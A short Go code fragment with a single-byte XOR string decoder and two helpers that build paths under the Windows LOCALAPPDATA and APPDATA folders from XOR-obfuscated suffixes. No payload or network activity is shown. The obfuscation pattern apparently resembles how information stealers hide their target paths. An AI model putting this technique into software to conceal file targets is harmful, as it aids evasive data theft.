// xorDecrypt decrypts a byte slice using a single-byte XOR key
func xorDecrypt(data []byte, key byte) string {
	res := make([]byte, len(data))
	for i := range data {
		res[i] = data[i] ^ key
	}
	return string(res)
}

// getLocalAppData constructs the path using the LOCALAPPDATA environment variable
func getLocalAppData(suffix []byte) string {
	return filepath.Join(os.Getenv("LOCALAPPDATA"), xorDecrypt(suffix, 0x5A))
}

// getAppData constructs the path using the APPDATA environment variable
func getAppData(suffix []byte) string {
	return filepath.Join(os.Getenv("APPDATA"), xorDecrypt(suffix, 0x5A))
}

